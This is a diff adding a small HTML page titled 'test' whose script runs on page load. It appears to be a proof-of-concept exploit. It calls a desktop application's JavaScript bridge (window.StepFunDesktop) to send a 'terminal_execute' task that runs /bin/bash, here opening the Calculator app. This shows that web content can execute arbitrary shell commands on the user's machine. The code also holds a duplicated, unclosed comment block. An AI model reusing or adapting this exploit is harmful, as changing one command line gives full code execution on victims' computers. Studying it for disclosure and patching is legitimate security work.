@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>test</title>
+    
+</head>
+<body>
+    <h1>test</h1>
+
+
+   <script>
+    /**
+     * 生成指定长度的随机字符串
+     * @param {number} length 字符串长度，默认20
+     * @returns {string} 随机字符串
+    /**
+     * 生成指定长度的随机字符串
+     * @param {number} length 字符串长度，默认20
+     * @returns {string} 随机字符串
+     */
+    function generateRandomString(length = 20) {
+        // 定义字符集：包含数字和大小写字母
+        const charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+        let result = '';
+        const charsetLength = charset.length;
+
+        // 边界值校验：确保长度为正整数
+        if (!Number.isInteger(length) || length <= 0) {
+            throw new Error('随机字符串长度必须是正整数');
+        }
+
+        // 循环生成指定长度的随机字符
+        for (let i = 0; i < length; i++) {
+            const randomIndex = Math.floor(Math.random() * charsetLength);
+            result += charset[randomIndex];
+        }
+
+        // 补充返回值（原代码缺失）
+        return result;
+    }
+
+    /**
+     * 调用Worker执行终端命令
+     * @returns {Promise<any>} 执行结果
+     */
+    async function callWorkerExecuteCommand() {
+        try {
+            // 构造data对象（避免硬编码JSON字符串，降低出错概率）
+            const commandData = {
+                command: "/bin/bash",
+                args: ["-c","'open -a Calculator.app'"],
+                detached: false,
+                timeout: 300000
+            };
+
+            // 构造请求参数
+            const result = await window.StepFunDesktop.Event.invokeToTarget(
+                'worker',
+                {
+                    event: 'global-notify:web-task',
+                    data: {
+                        taskId: generateRandomString(32),
+                        name: "terminal_execute",
+                        timeout: 100000,
+                        data: JSON.stringify(commandData), // 动态序列化
+                        url: "https://www.stepfun.com",
+                        user_id: "123"
+                    }
+                }
+            );
+
+            // 打印返回结果
+            console.log('Worker 执行结果:', result);
+            return result;
+
+        } catch (error) {
+            // 详细的错误日志
+            console.error('调用 Worker 失败:', error.message, error.stack);
+            // 抛出错误，让调用方可以处理
+            throw error;
+        }
+    }
+
+    // 调用函数（如需页面加载时执行，可绑定到DOMContentLoaded事件）
+    callWorkerExecuteCommand();
+</script>
+
+</body>
+</html>
